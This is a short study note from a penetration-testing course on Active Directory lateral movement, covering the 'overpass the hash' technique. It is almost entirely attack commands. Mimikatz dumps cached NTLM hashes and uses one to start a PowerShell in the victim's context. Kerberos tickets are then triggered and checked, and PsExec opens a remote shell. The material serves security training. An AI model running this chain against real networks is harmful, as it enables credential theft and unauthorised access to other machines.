# 24.1.4 — Overpass the Hash

- Module: PEN-200 · 24. Lateral Movement in Active Directory
- Source: portal.offsec.com · module `lateral-movement-in-active-directory-47888` (§24.1.4)
- Code blocks: 4

> Turn an **NTLM hash into a Kerberos TGT**, then use Kerberos-only tools — avoids NTLM
> authentication. Needs local admin on the box where the victim's creds are cached. Output omitted.

## Dump the target user's cached NTLM hash (Mimikatz, elevated)

```
privilege::debug
sekurlsa::logonpasswords
```

## Overpass-the-hash: spawn a process as the victim using their NTLM hash

```
sekurlsa::pth /user:{{USERNAME}} /domain:{{DOMAIN}} /ntlm:{{NTLM_HASH}} /run:powershell
```

> A new PowerShell runs in the victim's context. **`whoami` still shows the original user** — it
> reads the process token, not imported tickets. That's expected.

## Trigger a TGT/TGS, then confirm

```powershell
net use \\{{COMPUTER_NAME}}      # any domain-authenticated action creates the tickets
klist                            # #0 with server krbtgt = the TGT
```

## Reuse the TGT with a Kerberos tool (official PsExec, no hash support needed)

```powershell
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\{{COMPUTER_NAME}} cmd
```
